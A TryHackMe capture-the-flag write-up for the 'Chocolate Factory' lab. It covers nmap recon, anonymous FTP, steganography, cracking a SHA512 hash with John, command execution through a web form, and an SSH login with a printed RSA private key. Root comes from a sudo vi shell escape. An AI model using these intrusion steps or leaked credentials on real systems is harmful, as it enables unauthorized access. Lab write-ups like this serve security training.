# Chocolate Factory - TryHackMe Writeup

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **OS:** Linux
- **Objective:** Obtain root privileges

## 1. Reconnaissance
- First, we scan the target machine for open ports. I used nmap with NSE Default Scripts (`-sC`) and Service Version Detection (`-sV`):
```bash
nmap -sC -sV 10.112.131.30
```

- The scan returns multiple open ports across the target system. The primary entry points of interest are **port 21 (FTP)** and **port 22 (SSH)**.

- If we scan the target for hidden directories, we don't find something useful. As well if we check robots.txt. 

```bash
gobuster dir -u 10.112.131.30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

- Let's see what we have on the main page.

![alt text](Images/squirrelroom.png)

- Looks like we have a login form.

## 2. Initial Access

- Knowing that port 21 is open, let's connect to it as anonymous and see what we find. All we find is an image called "gum_room.jpg". It might be useful.

![alt text](Images/fpt.png)

- An image like this isn't put there without a reason, it has to hide something in it, which is why we'll search for an online steganography decoder and see if we find something useful. And we do find something interesting, a base64 encoded text.

![alt text](Images/image.png)

- If we copy the text and paste it in cyberchef with "From Base64" recipe and scroll to the bottom of the output we see: "charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/" which most probably gives as a username (charlie) and a SHA512 Hash. Next step would be to see if we can crack that hash and find out the password. We'll try to crack it using John the Ripper.

First we save the hash in a file:
```bash
echo '$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/' > hash.txt
```

Then we pass the file to John:
```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

And finally we use the following command to see what the password is:
```bash
john --show --format=sha512crypt hash.txt
```
It is: "cn7824".

- If we use these credentials on the main webpage, we succesfully login.

![alt text](Images/command.png)

- Here looks like we can type commands. For example if we type "ls" we get some results. 

![alt text](Images/ls.png)

- This is vulnerable to RCE which means we can look around the server to see if we can find interesting things. First let's see where we are, using "pwd".

![alt text](Images/pwd.png)

- If we use:
```bash
ls ../../../
```

we see the contents of the main directory:

![alt text](Images/main.png)

- From here we just navigate trough the system and try to `cat` what we can. I found a "key_rev_key" file which if we `cat` is kinda hard to see things, so we right click and go to inspect the source code. If we scroll a little bit down we see a secret key:"b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='" which is also the first question from the task. Another thing that I found out we can `cat` and is useful to us is the "teleport" file that gives us a RSA Private key which we might use to connect to SSH. This is how we get it:
```bash
cat ../../../home/charlie/teleport
```
-This is the key:
```text
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```

- We paste it in a file, give it write and read permissions only for us, because SSH rejects the key if it can be used by another user:

```bash
chmod 600 ssh_key
```

- And finally connect to SSH using:
```bash
ssh -i ssh_key charlie@10.113.134.175
```

![alt text](Images/ssh.png)

- Now we can get the first flag at "/home/charlie/user.txt", which we couldn't do in the command box on the web.

## 3. Privilege Escalation  

- We see what we can run using:
```bash
sudo -l
```
- And the results are: "/usr/bin/vi"
- We go to GTFOBins and search for an exploit: `sudo vi -c ':!/bin/sh' /dev/null`

![alt text](Images/root.png)

- In the root folder we find `root.py`. Running `python root.py` fails due to a missing Python 2 cryptography module, so we execute it using `python3 root.py`. When prompted for the key, entering the raw Fernet key extracted earlier (-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=, omitting the b'' bytes wrapper) decrypts the message and prints the final flag:

```text
flag{cec59161d338fef787fcb4e296b42124}
```

## 4. Summary & Key Takeaways

- **Insecure File Sharing (Anonymous FTP)**: Publicly writable or readable FTP servers expose internal assets to unauthenticated users, frequently leaking sensitive documents, backup archives, or media files containing steganographic secrets.

- **Steganography in Security Assessments**: Media assets found during reconnaissance should be examined for embedded metadata or hidden file payloads using tools like steghide, binwalk, or strings.

- **Bash Character Escaping**: Hashes formatted with $ characters (such as UNIX $6$ SHA-512) must always be wrapped in single quotes ('...') in shell environments; failure to do so causes Bash variable expansion to corrupt the string.

- **Dangers of Raw Command Execution (shell_exec)**: Passing unsanitized user input to system shell execution functions creates high-severity Remote Code Execution (RCE) flaws. Systems requiring command execution should implement strict whitelisting, parameterized execution (proc_open), or disable dangerous functions via disable_functions in php.ini.

- **Sudo Misconfigurations & GTFOBins**: Interactive binaries capable of spawning subshells (e.g., vi, less, nmap) must never be granted NOPASSWD sudo rights, as they allow users to bypass access restrictions and obtain elevated root privileges trivially.

- **Hardcoded Cryptographic Keys**: Storing symmetric encryption keys inside compiled client binaries leaves applications vulnerable to static analysis and reverse engineering (strings, Ghidra).